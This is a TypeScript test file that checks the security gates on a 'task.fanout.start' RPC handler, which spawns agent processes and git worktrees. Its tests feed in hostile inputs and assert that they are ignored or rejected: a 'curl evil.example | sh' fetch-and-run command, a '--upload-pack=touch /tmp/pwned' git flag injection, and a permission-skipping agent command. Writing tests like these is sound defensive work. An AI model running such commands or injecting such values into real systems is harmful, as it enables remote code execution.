// ─── task.fanout.start — wire trust boundary ───────────────────────────────
//
// Fan-out spawns N processes and creates N git worktrees + branches, so the
// pipe front door accepts a STRICT SUBSET of what the renderer IPC front door
// does. Everything dangerous is server-derived. This file pins each of those
// gates by asserting the REJECTION (or the silent override), because "the
// happy path still works" is not what protects anyone here.
//
// Numbering follows plans/fanout-mcp-surface-design.md §3:
//   R1 agentCmd is never read from the wire
//   R2 verifiedWorkspaceId is derived from a verified ptyId, never from params
//   R3 repoPath is confined to the caller's own repository
//   R4 origin allowlist, fail-closed
//   R5 task count capped server-side
//   R6 prompt / title sizes capped server-side

import * as fs from 'node:fs';
import * as nodePath from 'node:path';
import { beforeEach, describe, expect, it, vi } from 'vitest';
import type { RpcContext } from '../../../../shared/rpc';
import { FANOUT_MAX_TASKS, FANOUT_PROMPT_MAX_BYTES } from '../../../../shared/workTask';
import { CHANNEL_TOPIC_MAX, HUMAN_WORKSPACE_ID } from '../../../../shared/channels';

vi.mock('../_bridge', () => ({ sendToRenderer: vi.fn() }));
vi.mock('../../../git/git', () => ({ git: vi.fn() }));

import { sendToRenderer } from '../_bridge';
import { git } from '../../../git/git';
import { registerFanOutRpc, FANOUT_WIRE_AGENT_CMD } from '../fanout.rpc';
import type { FanOutRequest, FanOutResult, FanOutService, FanOutStatus } from '../../../worktask/FanOutService';
import type { RpcRouter } from '../../RpcRouter';

const CALLER_WS = 'ws-caller';
const CALLER_CWD = '/repo/packages/app';
const CALLER_REPO_ROOT = '/repo';
const FOREIGN_REPO_ROOT = '/elsewhere';

type Handler = (params: Record<string, unknown>, ctx?: RpcContext) => Promise<unknown>;

const LOCAL: RpcContext = { origin: 'local' };

interface Harness {
  call: (params: Record<string, unknown>, ctx?: RpcContext) => Promise<Record<string, unknown>>;
  /** Invoke with NO second argument at all — the "handler called without a
   *  context" case, which `call`'s default would otherwise paper over. */
  callWithoutCtx: (params: Record<string, unknown>) => Promise<Record<string, unknown>>;
  start: ReturnType<typeof vi.fn>;
  statusOf: ReturnType<typeof vi.fn>;
  /** The FanOutRequest the service was actually handed (asserts on overrides). */
  request: () => FanOutRequest;
}

function setup(opts?: { status?: FanOutStatus; ownerWorkspaceId?: string; cwd?: string | null }): Harness {
  const handlers = new Map<string, Handler>();
  const router = { register: (m: string, h: Handler) => handlers.set(m, h) } as unknown as RpcRouter;

  const start = vi
    .fn<(req: FanOutRequest) => Promise<FanOutResult>>()
    .mockResolvedValue({ ok: true, tasks: [] });
  const statusOf = vi.fn((): FanOutStatus => opts?.status ?? { state: 'unknown' });
  const service = { start, statusOf } as unknown as FanOutService;

  const ownerWs = opts?.ownerWorkspaceId === undefined ? CALLER_WS : opts.ownerWorkspaceId;
  const cwd = opts?.cwd === undefined ? CALLER_CWD : opts.cwd;

  vi.mocked(sendToRenderer).mockImplementation(async (_win, method: string) => {
    if (method === 'input.findOwnerWorkspace') return ownerWs ? { workspaceId: ownerWs } : {};
    if (method === 'workspace.list') return [{ id: ownerWs, metadata: { cwd } }];
    throw new Error(`unexpected renderer call: ${method}`);
  });

  // Every path under /repo is the caller's repo; /elsewhere is a different one.
  vi.mocked(git).mockImplementation(async (_args: string[], dir: string) => {
    if (dir.startsWith('/repo')) return { stdout: `${CALLER_REPO_ROOT}\n`, stderr: '', code: 0 };
    if (dir.startsWith('/elsewhere')) return { stdout: `${FOREIGN_REPO_ROOT}\n`, stderr: '', code: 0 };
    return { stdout: '', stderr: 'not a git repository', code: 128 };
  });

  registerFanOutRpc(router, service, () => null);
  const handler = handlers.get('task.fanout.start');
  if (!handler) throw new Error('task.fanout.start was not registered');

  return {
    call: async (params, ctx = LOCAL) => (await handler(params, ctx)) as Record<string, unknown>,
    callWithoutCtx: async (params) => (await handler(params)) as Record<string, unknown>,
    start,
    statusOf,
    request: () => start.mock.calls[0][0] as FanOutRequest,
  };
}

/** Minimum viable accepted call. */
function goodParams(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    idempotencyKey: 'fanout-key-1',
    senderPtyId: 'pty-1',
    titles: ['first task', 'second task'],
    prompt: 'do the thing',
    ...overrides,
  };
}

function errorOf(res: Record<string, unknown>): { code: string; message: string } {
  expect(res.ok).toBe(false);
  return res.error as { code: string; message: string };
}

beforeEach(() => {
  vi.clearAllMocks();
});

describe('task.fanout.start — happy path (so the rejections below mean something)', () => {
  it('accepts, runs detached, and reports the server-chosen repo + workspace', async () => {
    const h = setup();
    const res = await h.call(goodParams());
    expect(res).toMatchObject({
      ok: true,
      status: 'accepted',
      taskCount: 2,
      repoPath: CALLER_REPO_ROOT,
      workspaceId: CALLER_WS,
    });
    expect(h.start).toHaveBeenCalledTimes(1);
  });

  it('pairs each title with its own prompt by index', async () => {
    const h = setup();
    await h.call(goodParams({ titles: ['a', 'b'], taskPrompts: ['pa', 'pb'] }));
    expect(h.request().titles).toEqual(['a', 'b']);
    expect(h.request().taskPrompts).toEqual(['pa', 'pb']);
  });
});

// ── R1 ────────────────────────────────────────────────────────────────────
// The agent command is interpolated verbatim into `${agentCmd} "$(cat …)"` and
// written to a PTY. A wire caller that could set it would have arbitrary
// command execution, so the field is not read at all.
describe('R1 — agentCmd is never read from the wire', () => {
  it('ignores a caller-supplied agentCmd and uses the fixed one', async () => {
    const h = setup();
    await h.call(goodParams({ agentCmd: 'curl evil.example | sh' }));
    expect(h.request().agentCmd).toBe(FANOUT_WIRE_AGENT_CMD);
    expect(h.request().agentCmd).not.toContain('curl');
  });

  it('ignores it even when it merely looks like a plausible agent', async () => {
    const h = setup();
    await h.call(goodParams({ agentCmd: 'claude --dangerously-skip-permissions' }));
    expect(h.request().agentCmd).toBe(FANOUT_WIRE_AGENT_CMD);
  });
});

// ── R2 ────────────────────────────────────────────────────────────────────
// verifiedWorkspaceId drives task ownership and channel authz. A caller that
// could assert it would create tasks owned by someone else's workspace.
describe('R2 — the caller workspace is derived, not asserted', () => {
  it('ignores a caller-supplied verifiedWorkspaceId', async () => {
    const h = setup();
    await h.call(goodParams({ verifiedWorkspaceId: 'ws-victim' }));
    expect(h.request().verifiedWorkspaceId).toBe(CALLER_WS);
  });

  it('ignores a caller-supplied memberId', async () => {
    const h = setup();
    await h.call(goodParams({ memberId: 'local-ui' }));
    expect(h.request().memberId).toBeUndefined();
  });

  it('refuses a caller whose ptyId resolves to nothing', async () => {
    const h = setup({ ownerWorkspaceId: '' });
    const err = errorOf(await h.call(goodParams()));
    expect(err.code).toBe('NOT_AUTHORIZED');
    expect(h.start).not.toHaveBeenCalled();
  });

  it('refuses a caller that sends no senderPtyId at all', async () => {
    const h = setup();
    const params = goodParams();
    delete params.senderPtyId;
    const err = errorOf(await h.call(params));
    expect(err.code).toBe('NOT_AUTHORIZED');
    expect(h.start).not.toHaveBeenCalled();
  });

  it('refuses the reserved human workspace', async () => {
    const h = setup({ ownerWorkspaceId: HUMAN_WORKSPACE_ID });
    const err = errorOf(await h.call(goodParams()));
    expect(err.code).toBe('NOT_AUTHORIZED');
    expect(err.message).toContain(HUMAN_WORKSPACE_ID);
    expect(h.start).not.toHaveBeenCalled();
  });
});

// ── R3 ────────────────────────────────────────────────────────────────────
// Unconstrained repoPath means `git worktree add` plus a new branch in any
// repository on disk.
describe('R3 — repoPath is confined to the caller\'s own repository', () => {
  it('rejects a path in a different repository', async () => {
    const h = setup();
    const err = errorOf(await h.call(goodParams({ repoPath: '/elsewhere/project' })));
    expect(err.code).toBe('NOT_AUTHORIZED');
    expect(err.message).toContain(CALLER_REPO_ROOT);
    expect(h.start).not.toHaveBeenCalled();
  });

  it('rejects a path that is not a git repository at all', async () => {
    const h = setup();
    const err = errorOf(await h.call(goodParams({ repoPath: '/tmp/not-a-repo' })));
    expect(err.code).toBe('NOT_AUTHORIZED');
    expect(h.start).not.toHaveBeenCalled();
  });

  it('rejects a non-string repoPath', async () => {
    const h = setup();
    const err = errorOf(await h.call(goodParams({ repoPath: { toString: 'nope' } })));
    expect(err.code).toBe('INVALID_ARGUMENT');
    expect(h.start).not.toHaveBeenCalled();
  });

  it('rejects a flag-shaped path without handing it to git', async () => {
    const h = setup();
    const err = errorOf(await h.call(goodParams({ repoPath: '--upload-pack=touch /tmp/pwned' })));
    expect(err.code).toBe('NOT_AUTHORIZED');
    expect(h.start).not.toHaveBeenCalled();
  });

  it('accepts a subdirectory of the caller\'s own repo, but passes the ROOT on', async () => {
    const h = setup();
    const res = await h.call(goodParams({ repoPath: '/repo/packages/other' }));
    expect(res.ok).toBe(true);
    // The caller's string is never forwarded — the normalised toplevel is.
    expect(h.request().repoPath).toBe(CALLER_REPO_ROOT);
  });

  it('uses the caller\'s repo root when repoPath is omitted entirely', async () => {
    const h = setup();
    await h.call(goodParams());
    expect(h.request().repoPath).toBe(CALLER_REPO_ROOT);
  });

  it('refuses when the caller workspace has no working directory', async () => {
    const h = setup({ cwd: null });
    const err = errorOf(await h.call(goodParams()));
    expect(err.code).toBe('FAILED_PRECONDITION');
    expect(h.start).not.toHaveBeenCalled();
  });

  it('refuses when the caller workspace is not inside a git repository', async () => {
    const h = setup({ cwd: '/tmp/scratch' });
    const err = errorOf(await h.call(goodParams()));
    expect(err.code).toBe('FAILED_PRECONDITION');
    expect(h.start).not.toHaveBeenCalled();
  });
});

// ── R4 ────────────────────────────────────────────────────────────────────
// Same lane as the a2a execute spawn: local only, everything else fails closed.
describe('R4 — origin allowlist is fail-closed', () => {
  it('rejects a remote-origin caller', async () => {
    const h = setup();
    const err = errorOf(await h.call(goodParams(), { origin: 'remote' }));
    expect(err.code).toBe('NOT_AUTHORIZED');
    expect(h.start).not.toHaveBeenCalled();
  });

  it('rejects a caller with no context at all', async () => {
    const h = setup();
    const err = errorOf(await h.callWithoutCtx(goodParams()));
    expect(err.code).toBe('NOT_AUTHORIZED');
    expect(h.start).not.toHaveBeenCalled();
  });

  it('rejects before doing ANY identity or repo resolution', async () => {
    const h = setup();
    await h.call(goodParams(), { origin: 'remote' });
    expect(vi.mocked(sendToRenderer)).not.toHaveBeenCalled();
    expect(vi.mocked(git)).not.toHaveBeenCalled();
  });
});

// ── R5 ────────────────────────────────────────────────────────────────────
// The GUI offers 1..8; the wire does not go through the GUI.
describe('R5 — task count is capped server-side', () => {
  it(`rejects more than ${FANOUT_MAX_TASKS} titles`, async () => {
    const h = setup();
    const titles = Array.from({ length: FANOUT_MAX_TASKS + 1 }, (_, k) => `task ${k}`);
    const err = errorOf(await h.call(goodParams({ titles })));
    expect(err.code).toBe('INVALID_ARGUMENT');
    expect(err.message).toContain(String(FANOUT_MAX_TASKS));
    expect(h.start).not.toHaveBeenCalled();
  });

  it('rejects a huge array on its raw length (before any per-element work)', async () => {
    const h = setup();
    const titles = Array.from({ length: 5000 }, () => '');
    const err = errorOf(await h.call(goodParams({ titles })));
    expect(err.code).toBe('INVALID_ARGUMENT');
    expect(h.start).not.toHaveBeenCalled();
  });

  it(`accepts exactly ${FANOUT_MAX_TASKS}`, async () => {
    const h = setup();
    const titles = Array.from({ length: FANOUT_MAX_TASKS }, (_, k) => `task ${k}`);
    const res = await h.call(goodParams({ titles }));
    expect(res).toMatchObject({ ok: true, taskCount: FANOUT_MAX_TASKS });
  });

  it('rejects an over-long taskPrompts array too', async () => {
    const h = setup();
    const taskPrompts = Array.from({ length: FANOUT_MAX_TASKS + 1 }, () => 'p');
    const err = errorOf(await h.call(goodParams({ taskPrompts })));
    expect(err.code).toBe('INVALID_ARGUMENT');
    expect(h.start).not.toHaveBeenCalled();
  });

  it('rejects zero usable titles', async () => {
    const h = setup();
    const err = errorOf(await h.call(goodParams({ titles: ['   ', ''] })));
    expect(err.code).toBe('INVALID_ARGUMENT');
    expect(h.start).not.toHaveBeenCalled();
  });

  it('rejects a non-array titles', async () => {
    const h = setup();
    const err = errorOf(await h.call(goodParams({ titles: 'one, two' })));
    expect(err.code).toBe('INVALID_ARGUMENT');
    expect(h.start).not.toHaveBeenCalled();
  });
});

// ── R6 ────────────────────────────────────────────────────────────────────
describe('R6 — prompt and title sizes are capped server-side', () => {
  it('rejects an oversized shared prompt', async () => {
    const h = setup();
    const err = errorOf(await h.call(goodParams({ prompt: 'x'.repeat(FANOUT_PROMPT_MAX_BYTES + 1) })));
    expect(err.code).toBe('INVALID_ARGUMENT');
    expect(h.start).not.toHaveBeenCalled();
  });

  it('rejects when shared + per-task together exceed the cap', async () => {
    const h = setup();
    const half = 'x'.repeat(FANOUT_PROMPT_MAX_BYTES - 10);
    const err = errorOf(
      await h.call(goodParams({ titles: ['a'], prompt: half, taskPrompts: ['y'.repeat(100)] })),
    );
    expect(err.code).toBe('INVALID_ARGUMENT');
    expect(h.start).not.toHaveBeenCalled();
  });

  it('measures the cap in UTF-8 BYTES, not characters', async () => {
    const h = setup();
    // Each CJK char is 3 bytes, so this is under the char count but over bytes.
    const prompt = '가'.repeat(Math.floor(FANOUT_PROMPT_MAX_BYTES / 3) + 1);
    expect(prompt.length).toBeLessThan(FANOUT_PROMPT_MAX_BYTES);
    const err = errorOf(await h.call(goodParams({ prompt })));
    expect(err.code).toBe('INVALID_ARGUMENT');
  });

  it('rejects an over-long title', async () => {
    const h = setup();
    const err = errorOf(await h.call(goodParams({ titles: ['t'.repeat(CHANNEL_TOPIC_MAX + 1)] })));
    expect(err.code).toBe('INVALID_ARGUMENT');
    expect(h.start).not.toHaveBeenCalled();
  });
});

// ── idempotency key / poll protocol ───────────────────────────────────────
describe('idempotency key is required and doubles as the poll handle', () => {
  it('rejects a missing key', async () => {
    const h = setup();
    const params = goodParams();
    delete params.idempotencyKey;
    const err = errorOf(await h.call(params));
    expect(err.code).toBe('INVALID_ARGUMENT');
    expect(h.start).not.toHaveBeenCalled();
  });

  it('reports running for an in-flight key without starting a second run', async () => {
    const h = setup({ status: { state: 'running' } });
    const res = await h.call(goodParams());
    expect(res).toMatchObject({ ok: true, status: 'running' });
    expect(h.start).not.toHaveBeenCalled();
  });

  it('returns the recorded result for a completed key without re-running', async () => {
    const done: FanOutResult = { ok: true, tasks: [{ index: 0, title: 'a', ok: true, taskId: 'wtask-1' }] };
    const h = setup({ status: { state: 'done', result: done } });
    const res = await h.call(goodParams());
    expect(res).toMatchObject({ ok: true, status: 'completed', result: done });
    expect(h.start).not.toHaveBeenCalled();
  });

  it('answers a known key WITHOUT touching the renderer or git', async () => {
    const h = setup({ status: { state: 'running' } });
    await h.call(goodParams());
    expect(vi.mocked(sendToRenderer)).not.toHaveBeenCalled();
    expect(vi.mocked(git)).not.toHaveBeenCalled();
  });
});

// ── one service, two front doors ──────────────────────────────────────────
//
// The idempotency LRU and the in-flight set are INSTANCE fields of
// FanOutService. A second instance therefore means the same key is accepted
// twice and the fan-out runs twice — duplicate worktrees, workspaces and
// missions. That invariant lives in main/index.ts wiring, which no unit test
// can exercise, so pin it at the source level instead.
describe('FanOutService is constructed exactly once in main', () => {
  // src/main/pipe/handlers/__tests__ -> src/main
  const MAIN_DIR = nodePath.resolve(__dirname, '..', '..', '..');

  function collectTsFiles(dir: string): string[] {
    const out: string[] = [];
    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
      const full = nodePath.join(dir, entry.name);
      if (entry.isDirectory()) {
        if (entry.name === '__tests__' || entry.name === 'node_modules') continue;
        out.push(...collectTsFiles(full));
      } else if (entry.name.endsWith('.ts') && !entry.name.endsWith('.d.ts')) {
        out.push(full);
      }
    }
    return out;
  }

  it('has exactly one `new FanOutService(` in src/main, in the factory', () => {
    const sites = collectTsFiles(MAIN_DIR).filter((f) =>
      /\bnew FanOutService\s*\(/.test(fs.readFileSync(f, 'utf8')),
    );
    expect(sites.map((f) => nodePath.relative(MAIN_DIR, f))).toEqual([
      nodePath.join('worktask', 'createFanOutService.ts'),
    ]);
  });

  it('wires both front doors from one createFanOutService call', () => {
    const src = fs.readFileSync(nodePath.join(MAIN_DIR, 'index.ts'), 'utf8');
    const created = src.match(/createFanOutService\s*\(/g) ?? [];
    expect(created).toHaveLength(1);
    // Both registrars receive the SAME binding.
    expect(src).toMatch(/const fanOutService = createFanOutService\(/);
    expect(src).toMatch(/registerFanOutRpc\(rpcRouter, fanOutService,/);
    expect(src).toMatch(/registerFanOutHandler\(fanOutService\)/);
  });
});
